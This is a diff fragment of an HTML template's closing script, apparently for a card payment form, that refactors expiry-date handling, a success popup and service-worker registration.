+    </a>
+
+    <!-- ====== SCRIPTS ====== -->
     <script>
+        // Form submission handler: combine expiry month/year into hidden field
         document.querySelector('form').addEventListener('submit', function(event) {
             var expiryMonth = document.getElementById('expiry-month').value;
             var expiryYear = document.getElementById('expiry-year').value;
 
             if (expiryMonth && expiryYear) {
-                // Combine the month and year in MM/YYYY format
                 document.getElementById('expiry_date').value = expiryMonth + '/' + expiryYear;
-
-                // Show success popup (for demo purposes)
-                // In a real application, this would be handled by the server response
-                // event.preventDefault();
-                // document.getElementById('successPopup').classList.add('show');
             } else {
-                // If the month or year is not selected, prevent form submission
                 event.preventDefault();
                 alert("Please select both month and year for expiration date.");
             }
         });
 
+        // Success popup controls
         function closePopup() {
             document.getElementById('successPopup').classList.remove('show');
         }
-         if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register("{% static 'sw.js' %}")
-        .then(registration => {
-            console.log('✅ Service Worker Registered:', registration);
 
-            // Check for updates
-            registration.addEventListener('updatefound', () => {
-                const newWorker = registration.installing;
-                console.log('🔄 New service worker found:', newWorker);
-            });
-        })
-        .catch(error => {
-            console.log('❌ Service Worker registration failed:', error);
-        });
-    }
+        // Optional: show popup on success (if you want to trigger from server response)
+        // You can call showPopup() from your backend via a flag or after form success.
+        function showPopup() {
+            document.getElementById('successPopup').classList.add('show');
+        }
+
+        // Service Worker registration
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register("{% static 'sw.js' %}")
+                .then(reg => console.log('✅ SW registered:', reg))
+                .catch(err => console.log('❌ SW registration failed:', err));
+        }
     </script>
+
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
